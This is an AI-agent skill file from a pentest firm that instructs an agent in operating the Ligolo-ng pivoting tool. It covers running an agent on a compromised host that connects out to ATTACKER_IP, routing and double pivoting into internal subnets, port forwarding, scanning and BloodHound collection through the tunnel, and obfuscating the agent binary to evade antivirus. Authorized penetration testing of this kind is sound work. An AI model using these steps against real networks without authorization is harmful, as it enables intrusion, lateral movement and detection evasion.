---
name: ligolo-ng
description: >
  Operate Ligolo-ng — an advanced tunneling and pivoting framework using TUN interfaces to route
  traffic through compromised hosts without SOCKS proxies or proxychains. Use when pivoting into
  internal networks during penetration tests, setting up multi-hop tunnels (double pivoting), forwarding
  ports, or replacing chisel/SSH tunneling in your post-exploitation workflow. Covers installation,
  TUN interface setup, proxy/agent architecture, starting tunnels, adding routes, double pivoting,
  port forwarding, multiple sessions, and comparison with alternative pivoting tools.
metadata:
  author: redhoundinfosec
  version: '1.0'
  repo: https://github.com/nicocha30/ligolo-ng
  stars: '3.8k'
  language: Go
---

# ligolo-ng Agent Skill

## When to Use This Skill

Use this skill when:
- You have a foothold on a DMZ or compromised host and need to reach internal network segments
- Setting up seamless routing to internal subnets without proxychains overhead
- Implementing double-pivot (attacker → host A → host B → internal network)
- Forwarding specific ports from internal machines to your attacker box
- Replacing chisel or SSH `-D` tunnels with a more capable pivoting solution
- The user asks about network pivoting, TUN-based tunneling, or Ligolo-ng configuration

## What Ligolo-ng Does

Ligolo-ng creates a TUN (network tunnel) interface on the attacker machine and routes all traffic to
internal network segments through a lightweight agent running on the compromised host — without
requiring SOCKS proxies or proxychains. The agent makes an outbound connection to the attacker-controlled
proxy, which then provides full routing-level access to the internal network. The result is native TCP/UDP
connectivity to internal hosts: run nmap, nessus, bloodhound, or any tool directly.

## Architecture

```
Attacker Machine (Linux)              Compromised Host
┌──────────────────────────┐          ┌──────────────────────────┐
│  ligolo-ng proxy         │◄─────────│  ligolo-ng agent         │
│  TUN interface: ligolo0  │  TLS C2  │  (outbound connection)   │
│  Route: 10.10.10.0/24    │          │  NIC: 10.10.10.50        │
│  via ligolo0             │          │  NIC: 172.16.0.1 (DMZ)   │
└──────────────────────────┘          └──────────────────────────┘
         │ native routing
         ▼
   nmap 10.10.10.0/24 ← works directly, no proxychains
```

The proxy runs on the attacker box and listens for agent connections. The agent runs on the pivot
host and dials out, bypassing most inbound firewall rules.

## Installation

### Method 1 — Download Pre-compiled Releases (recommended)

```bash
# Get latest release
VERSION=$(curl -s https://api.github.com/repos/nicocha30/ligolo-ng/releases/latest \
  | grep tag_name | cut -d '"' -f4)

# Download proxy (runs on attacker Linux)
wget "https://github.com/nicocha30/ligolo-ng/releases/download/${VERSION}/proxy_linux_amd64.tar.gz"
tar -xzf proxy_linux_amd64.tar.gz

# Download agent for target OS
# Linux agent (64-bit)
wget "https://github.com/nicocha30/ligolo-ng/releases/download/${VERSION}/agent_linux_amd64.tar.gz"
# Windows agent (64-bit)
wget "https://github.com/nicocha30/ligolo-ng/releases/download/${VERSION}/agent_windows_amd64.zip"
# Linux agent (32-bit, for older pivots)
wget "https://github.com/nicocha30/ligolo-ng/releases/download/${VERSION}/agent_linux_386.tar.gz"
```

### Method 2 — Build from Source

```bash
git clone https://github.com/nicocha30/ligolo-ng.git
cd ligolo-ng

# Build proxy (attacker machine)
go build -o proxy cmd/proxy/main.go

# Build agent (for Linux pivot)
go build -o agent cmd/agent/main.go

# Cross-compile agent for Windows pivot
GOOS=windows GOARCH=amd64 go build -o agent.exe cmd/agent/main.go

# Cross-compile agent for 32-bit Linux
GOARCH=386 go build -o agent32 cmd/agent/main.go
```

## TUN Interface Setup

This is required only once on the attacker machine. You need root or `CAP_NET_ADMIN`.

```bash
# Create TUN interface named "ligolo"
sudo ip tuntap add user $USER mode tun ligolo

# Bring the interface up
sudo ip link set ligolo up

# Verify interface exists
ip link show ligolo
# Output: ligolo: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 ...
```

The interface has no IP assigned — Ligolo-ng uses it purely for routing.

## Starting the Proxy

The proxy runs on the attacker machine and listens for agent connections.

```bash
# Start proxy with self-signed certificate (quick start)
./proxy -selfcert

# Start proxy on specific port (default: 11601)
./proxy -selfcert -laddr 0.0.0.0:11601

# Start proxy with your own TLS certificate
./proxy -certfile server.crt -keyfile server.key

# Start proxy in verbose mode
./proxy -selfcert -v

# Proxy interactive shell prompt appears:
# ligolo-ng »
```

## Connecting the Agent

Run the agent on the compromised pivot host. It dials OUT to the proxy.

```bash
# Linux agent — connect to attacker proxy
./agent -connect ATTACKER_IP:11601 -ignore-cert

# Windows agent (PowerShell or cmd)
.\agent.exe -connect ATTACKER_IP:11601 -ignore-cert

# Agent with retry on disconnect
./agent -connect ATTACKER_IP:11601 -ignore-cert -retry

# If pivot host can only reach internet via proxy:
./agent -connect ATTACKER_IP:11601 -ignore-cert -http-proxy http://CORP_PROXY:8080
```

## Starting a Tunnel

Once the agent connects, you'll see it in the proxy's interactive shell.

```bash
# In proxy shell — list sessions
ligolo-ng » session
# [0] Agent: CORP\bob@DESKTOP-PIVOT01 - 10.10.10.50 (Windows) - [10.10.10.50:49512]

# Select session
ligolo-ng » session
# Select: 0

# Show network interfaces on pivot host
[Agent: CORP\bob@DESKTOP-PIVOT01] » ifconfig
# Shows all NICs on pivot: 10.10.10.50/24, 172.16.0.1/24

# Start the tunnel
[Agent: CORP\bob@DESKTOP-PIVOT01] » start
# [Agent: CORP\bob@DESKTOP-PIVOT01] Tunnel started
```

## Adding Routes to Internal Networks

After starting the tunnel, add routes on the attacker machine to reach internal subnets via the TUN interface.

```bash
# Route to internal subnet through ligolo TUN interface
sudo ip route add 172.16.0.0/24 dev ligolo
sudo ip route add 10.10.10.0/24 dev ligolo

# Verify routes
ip route | grep ligolo
# 172.16.0.0/24 dev ligolo scope link

# Test connectivity — direct, no proxychains needed
ping 172.16.0.5
nmap -sV 172.16.0.5
curl http://172.16.0.10/
```

## Port Forwarding

Forward a port on the pivot host (or a host reachable by pivot) to a local port on the attacker.

```bash
# In proxy shell — add a listener on the agent side
# Forward pivot host's 127.0.0.1:3389 to attacker's 0.0.0.0:3389
[Agent] » listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:3389
# Listens on pivot 0.0.0.0:1234, forwards to pivot's localhost:3389

# List active listeners
[Agent] » listener_list

# Remove a listener
[Agent] » listener_del --id 0

# Forward internal host's SSH to attacker port 2222
[Agent] » listener_add --addr 0.0.0.0:2222 --to 172.16.0.5:22
# Then on attacker: ssh -p 2222 user@PIVOT_HOST_IP
```

## Double Pivoting

Access a network reachable only from the second pivot (host B), using host A as an intermediate.

```bash
# Topology:
# Attacker → Host A (10.10.10.50) → Host B (172.16.0.5) → Internal (192.168.100.0/24)

# Step 1 — Set up first tunnel (Attacker → Host A)
# [on Host A] ./agent -connect ATTACKER:11601 -ignore-cert
# [proxy shell] session 0 → start
# [attacker] sudo ip route add 172.16.0.0/24 dev ligolo

# Step 2 — Transfer agent to Host B via Host A
# Use first tunnel to reach Host B and upload agent binary
scp agent user@172.16.0.5:/tmp/agent      # routed through ligolo TUN

# Step 3 — Start a second proxy listener on attacker (different port)
./proxy -selfcert -laddr 0.0.0.0:11602

# Step 4 — On Host A, create a port forward to proxy port 11602
# (Host B cannot reach attacker directly)
[Agent@HostA] » listener_add --addr 0.0.0.0:11602 --to ATTACKER_IP:11602

# Step 5 — Connect agent on Host B to Host A's relay port
# [on Host B] ./agent -connect HOST_A_IP:11602 -ignore-cert

# Step 6 — In second proxy shell, start tunnel for Host B
[Agent@HostB] » ifconfig   # shows 192.168.100.0/24 NIC
[Agent@HostB] » start

# Step 7 — Add route for deep subnet
sudo ip route add 192.168.100.0/24 dev ligolo   # (or a second tuntap if needed)
```

## Multiple Sessions

Ligolo-ng supports multiple concurrent agent sessions.

```bash
# List all sessions
ligolo-ng » session
# [0] Agent: user@pivot1 - 10.10.10.50
# [1] Agent: user@pivot2 - 172.16.0.5

# Switch active session
ligolo-ng » session
# Select: 1

# Each session gets its own tunnel; manage routes per-session
# Use multiple TUN interfaces for multiple simultaneous tunnels:
sudo ip tuntap add user $USER mode tun ligolo2
sudo ip link set ligolo2 up
# Start second tunnel and route second subnet via ligolo2
```

## Comparison with Other Pivoting Tools

| Feature | Ligolo-ng | Chisel | SSH -D | Proxychains |
|---------|-----------|--------|--------|-------------|
| Full routing (no proxychains) | ✅ | ❌ | ❌ | N/A |
| UDP support | ✅ | ❌ | ❌ | ❌ |
| ICMP (ping) through tunnel | ✅ | ❌ | ❌ | ❌ |
| Outbound agent (bypasses inbound FW) | ✅ | ✅ | ❌ | N/A |
| Native tool compatibility | ✅ | ❌ | ❌ | Partial |
| Double pivot ease | ✅ | Complex | Complex | N/A |
| Windows agent | ✅ | ✅ | Limited | ❌ |
| Requires root on attacker | ✅ (TUN) | ❌ | ❌ | ❌ |

Ligolo-ng's primary advantage is full kernel-level routing — tools like nmap, gobuster, bloodhound,
and Metasploit work natively against internal hosts without any proxy configuration.

## Advanced Techniques

### Running Nmap Through Tunnel

```bash
# After routing established — full nmap with SYN scan, no proxychains
sudo nmap -sV -sC -p- 172.16.0.0/24 --open -oX internal_nmap.xml

# Note: ICMP works through ligolo-ng (unlike proxychains), so -sn ping sweep works
sudo nmap -sn 172.16.0.0/24
```

### BloodHound Collection Through Tunnel

```bash
# Route established to AD domain subnet
# Run SharpHound or bloodhound-python directly
python3 bloodhound.py -u 'user' -p 'pass' -d corp.local \
  -ns 172.16.0.1 --zip -c All
```

### Nessus / OpenVAS Scanning Through Tunnel

Configure Nessus to scan internal subnet — traffic routes via ligolo TUN without any proxy config.

## Troubleshooting

| Issue | Cause | Fix |
|-------|-------|-----|
| `TUN interface not found` | tuntap not created | `sudo ip tuntap add user $USER mode tun ligolo` |
| Agent connects but no traffic | Route not added | `sudo ip route add SUBNET dev ligolo` |
| `permission denied` creating TUN | No CAP_NET_ADMIN | Run with sudo; or grant capability to proxy binary |
| Agent keeps disconnecting | Unstable connection | Use `-retry` flag on agent |
| `-ignore-cert` required | Self-signed cert | Use `-certfile`/`-keyfile` for production |
| Double pivot traffic fails | Missing relay listener | Verify `listener_add` on Host A before agent on B connects |
| nmap SYN scan fails | Needs raw socket (root) | Run nmap as root; or use `-sT` (connect scan) |
| Windows agent flagged by AV | Signature detection | Recompile with custom GOFLAGS; obfuscate with garble |
---

> Built by [Red Hound InfoSec](https://redhound.us) — On-demand offensive security expertise for SMBs.
> 20+ years of Fortune 500 experience. Penetration testing, attack surface analysis, and security consulting.
>
> [redhound.us](https://redhound.us) | [GitHub](https://github.com/redhoundinfosec) | [Book a consultation](https://redhound.us/#contact)
